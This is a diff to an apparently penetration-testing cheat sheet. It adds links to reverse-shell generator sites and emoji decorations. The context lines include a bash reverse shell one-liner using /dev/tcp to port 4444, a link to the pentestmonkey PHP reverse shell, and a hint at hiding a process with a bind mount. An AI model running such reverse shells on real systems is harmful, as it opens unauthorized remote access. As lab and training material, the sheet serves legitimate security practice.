@@ -47,16 +47,21 @@ mount -o bind /tmp /proc/your-PID-here
 ## --> [ Useful Websites to get Reverse shell & Privilege escalation ] <--
 
 
-- ***Use this website to generate Reverse shell command (bash,python,PHP,socat)***
+- ***Use this website to generate Reverse shell command (bash,python,PHP,socat)☠️***
 ```
 https://www.revshells.com/ 
 ```
+- ***Reverse Shell generator + other Useful commands for basic penetration  testing🛠️***
+```
+https://tex2e.github.io/reverse-shell-generator/index.html
+```
+
 - ***Easy to Remember Reverse shell 🐚  oneliner***
 ```
 bash -c "bash -i >& /dev/tcp/0.0.0.0/4444 0>&1"
 ```
 
-- ***Use this github repo to get code of php-reverse-shell.php*** 
+- ***Use this github repo to get code of php-reverse-shell.php 🐒*** 
 ```
 https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php 
 ```
